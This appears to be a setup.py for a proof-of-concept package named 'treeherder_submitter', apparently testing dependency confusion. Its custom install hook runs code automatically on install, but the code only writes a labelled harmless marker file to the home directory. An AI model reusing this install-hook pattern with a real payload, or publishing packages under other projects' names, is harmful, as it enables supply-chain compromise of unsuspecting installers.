
from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstallCommand(install):
    def run(self):
        home_dir = os.path.expanduser("~")
        file_path = os.path.join(home_dir, "cygut7.txt")
        with open(file_path, "w") as f:
            f.write("This is a harmless PoC file to demonstrate RCE capabilities - cygut7\n")
        print(f"[+] PoC file created at: {file_path}")
        install.run(self)

setup(
    name="treeherder_submitter",
    version="0.0.1",
    description="Safe dummy package to demonstrate PoC upload - cygut7",
    author="cygut7",
    author_email="cygut7@cygut7.com",
    packages=["treeherder_submitter"],
    cmdclass={'install': CustomInstallCommand},
    python_requires=">=3.6",
)
